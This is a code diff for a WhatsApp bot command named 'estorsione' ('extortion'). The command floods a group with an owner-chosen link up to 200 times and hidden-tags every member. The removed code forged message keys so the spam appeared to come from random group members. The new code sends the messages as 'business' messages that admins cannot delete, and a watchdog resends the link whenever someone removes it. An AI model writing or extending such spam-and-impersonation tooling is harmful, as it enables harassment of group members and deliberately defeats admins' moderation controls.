@@ -3,15 +3,13 @@
 // ─────────────────────────────────────────────────────────────────────────────
 //  ESTORSIONE — Vex Bot (solo OWNER)
 //  L'owner imposta il link nella chat privata del bot: `.estorsione set <link>`.
-//  Nei gruppi: `.estorsione <n>` spamma il link n volte (max 200) con HIDE TAG
-//  a tutti i membri e NON invia alcun messaggio finale. I messaggi partono via
-//  relay con la key "spoofata" (sender = un membro a caso) e, se gli admin li
-//  cancellano, il watchdog di lib/estorsione li RIMANDA subito: il link non si
-//  riesce a eliminare (sessione attiva 15 min).
+//  Nei gruppi: `.estorsione <n>` spamma il link n volte (max 200) come messaggi
+//  BUSINESS (scritta "WhatsApp Business" sopra la bolla, NON cancellabili dagli
+//  admin) con hide tag a tutti e NON invia alcun messaggio finale. In più il
+//  watchdog di lib/estorsione rimanda il link se qualcuno lo elimina.
 // ─────────────────────────────────────────────────────────────────────────────
 
 const SEP = '━━━━━━━━━━━━━━━━━━';
-const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 const estorsione = require('../../lib/estorsione');
 
 const MAX_SPAM = 200;
@@ -112,45 +110,14 @@ ${SEP}
         estorsione.startSession(from, link);
 
         try {
-            const meta = await sock.groupMetadata(from);
-            const participants = Array.isArray(meta.participants) ? meta.participants : [];
-            const allJids = participants.map(p => p.phoneNumber || p.id || p.jid).filter(Boolean);
-            const spoofPool = allJids.length ? allJids : [null];
-
-            const body =
-`🚨 *_ESTORSIONE_*
-${SEP}
-💥 Entrate adesso:
-${SEP}
-${link}
-${SEP}
-◈ _Vex Bot_`;
-
             for (let i = 0; i < times; i++) {
-                // Hide tag: menziona tutti senza mostrare @handle visibili
-                const hidden = allJids.map(() => '\u200b').join(' ');
-                const text = `${body}\n${hidden}`;
-                const content = {
-                    extendedTextMessage: proto.Message.ExtendedTextMessage.create({
-                        text,
-                        contextInfo: { mentionedJid: allJids },
-                    }),
-                };
-                const generated = generateWAMessageFromContent(from, content, {
-                    userJid: sock.user?.id || sock.user?.lid,
-                });
-                // Key "spoofata": il messaggio appare come inviato da un membro
-                // a caso del gruppo → gli admin NON possono cancellarlo.
-                const spoof = spoofPool[i % spoofPool.length];
-                if (spoof) {
-                    generated.key.participant = spoof;
-                    generated.key.fromMe = false;
-                }
+                // Messaggio "business" (nodi biz): scritta WhatsApp Business
+                // sopra la bolla e NON cancellabile dagli admin.
                 try {
-                    await sock.relayMessage(from, generated.message, { messageId: generated.key.id });
+                    await estorsione.sendLink(sock, from, link);
                 } catch (e) {
                     console.error('[estorsione] relay fallito, invio normale:', e.message);
-                    await sock.sendMessage(from, { text, mentions: allJids });
+                    await sock.sendMessage(from, { text: link });
                 }
                 if (i < times - 1) await new Promise(r => setTimeout(r, SPAM_DELAY));
             }
